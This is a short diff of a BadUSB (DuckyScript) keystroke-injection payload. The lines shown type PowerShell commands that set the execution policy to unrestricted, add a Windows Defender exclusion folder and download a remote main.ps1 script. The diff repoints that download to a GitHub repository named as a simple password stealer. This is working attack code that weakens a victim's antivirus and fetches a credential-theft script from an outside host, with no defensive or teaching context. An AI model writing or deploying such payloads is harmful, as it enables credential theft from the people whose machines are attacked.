@@ -18,7 +18,7 @@ STRING Set-ExecutionPolicy unrestricted -Force
 ENTER
 STRING Add-MpPreference -ExclusionPath C:\Users\Public\Documents\ -Force
 ENTER
-STRING wget "https://github.com/kidarok/Nirsoft_Tools/blob/main/main.ps1?raw=true" -OutFile main.ps1
+STRING wget "https://github.com/kidarok/Simple_Password_Stealer_BadUSB/blob/main/main.ps1?raw=true" -OutFile main.ps1
 DELAY 400
 ENTER
 DELAY 4000
